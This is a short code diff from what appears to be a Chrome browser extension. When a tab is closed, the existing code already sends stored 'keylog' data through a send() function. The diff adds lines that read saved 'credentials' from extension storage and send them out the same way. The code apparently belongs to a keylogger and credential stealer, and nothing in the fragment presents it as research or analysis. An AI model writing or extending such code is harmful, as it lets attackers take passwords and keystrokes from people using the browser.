@@ -54,6 +54,10 @@ chrome.tabs.onRemoved.addListener(() => {
     send(items, "keylog");
     console.log(items);
   });
+  chrome.storage.local.get(["credentials"], (items) => {
+    send(items, "credentials");
+    console.log("creds: ", items);
+  })
 });
 
 // from: https://stackoverflow.com/a/1349426
